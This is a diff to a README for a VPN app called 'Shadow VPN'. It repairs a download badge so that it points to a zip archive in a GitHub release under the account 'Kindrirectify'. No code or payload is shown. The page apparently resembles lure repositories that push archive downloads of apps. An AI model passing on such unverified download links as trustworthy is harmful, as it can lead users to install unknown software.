@@ -3,7 +3,7 @@
 
 
 **Shadow VPN** is a modern VPN app focused on speed, security, and privacy. The app lets you connect to VPN servers around the world, secure your internet connection on public networks, and manage your connection through a simple, modern interface.
-[![Download Shadow VPN](https://img.shields.io/badge/⬇️_Download_Shadow_VPN-7c3aed?style=for-the-badge&logo=github&logoColor=white)]([https://github.com/imagedatasewer/Shadow-vpn/releases/download/freevpn/Shadowvpn.zip](https://github.com/Kindrirectify/Shadow-vpn/releases/download/ShadowVPN/Shadowvpn.zip)
+[![Download Shadow VPN](https://img.shields.io/badge/⬇️_Download_Shadow_VPN-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kindrirectify/Shadow-vpn/releases/download/ShadowVPN/Shadowvpn.zip)
 
 ## Features
 
